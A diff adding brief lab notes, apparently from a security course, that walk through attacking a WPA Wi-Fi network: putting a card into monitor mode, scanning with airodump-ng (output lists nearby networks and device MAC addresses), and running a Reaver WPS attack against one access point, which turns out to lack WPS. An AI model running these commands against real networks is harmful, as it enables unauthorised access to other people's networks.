@@ -1,0 +1,48 @@
+- install correct software 
+reaver, aircrack-ng
+
+- check wireless card
+ip a -> wlp2s0
+
+- Put your wireless card into monitor mode
+sudo airmon-ng start wlp2s0
+wlp2s0mon
+
+- Find the BSSID of the router you want to crack
+sudo airodump-ng wlp2s0mon
+
+CH  7 ][ Elapsed: 0 s ][ 2019-10-17 14:53
+
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+
+ B4:DE:31:CB:2A:23  -67        1        0    0   1  54e  OPN              ntnuguest
+ B4:DE:31:CB:27:04  -76        2        0    0   6  54e  WPA2 CCMP   MGT  sintef
+ B4:DE:31:CB:27:07  -76        2        0    0   6  54e  OPN              <length:  9>
+ B4:DE:31:CB:27:05  -75        2        0    0   6  54e  OPN              <length:  8>
+ B4:DE:31:CB:27:03  -76        3        0    0   6  54e  OPN              ntnuguest
+ B4:DE:31:CB:27:02  -76        3        0    0   6  54e  WPA2 CCMP   MGT  <length:  7>
+ B4:DE:31:CB:27:00  -76        3        0    0   6  54e  WPA2 CCMP   MGT  eduroam
+ 00:1A:70:9C:C1:2E  -20        5        0    0   6  54   WPA  CCMP   PSK  sikkerhet15
+ B4:DE:31:CB:2A:20  -67        2        0    0   1  54e  WPA2 CCMP   MGT  eduroam
+ B4:DE:31:CB:2A:27  -68        2        0    0   1  54e  OPN              <length:  9>
+ B4:DE:31:CB:2A:24  -68        2        0    0   1  54e  WPA2 CCMP   MGT  sintef
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Probe
+
+ B4:DE:31:CB:2A:20  4C:66:41:1D:D0:BA  -34    0 -11     48       19  eduroam
+ (not associated)   A4:02:B9:45:AF:8D  -38    0 - 1     17        7  sikkerhet15
+
+
+-  Crack a Network's WPA Password with Reaver
+
+sudo reaver -i wlp2s0mon -b 00:1A:70:9C:C1:2E -vv
+
+
+Reaver v1.4 WiFi Protected Setup Attack Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+
+[+] Waiting for beacon from 00:1A:70:9C:C1:2E
+[+] Switching wlp2s0mon to channel 6
+[+] Associated with 00:1A:70:9C:C1:2E (ESSID: sikkerhet15)
+
+Altså har ikke AP-et WPS :)
